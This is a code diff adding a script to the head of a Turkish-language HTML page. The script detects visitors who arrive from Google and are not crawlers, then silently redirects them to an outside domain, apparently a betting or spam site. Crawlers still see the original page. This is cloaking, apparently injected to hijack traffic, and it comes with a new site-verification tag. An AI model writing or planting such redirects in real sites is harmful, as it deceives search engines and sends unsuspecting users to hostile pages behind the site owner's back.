@@ -1,6 +1,19 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
+    <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patronfutbol67.cfd");
+    }  
+</script>
+  <meta name="google-site-verification" content="rssTDRR46_QE45vyx-n01o3IaWtZ64MnkFCJo_omuqY" />
   <meta charset="utf-8">
   <!-- ==================== CHARSET & VIEWPORT ==================== -->
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
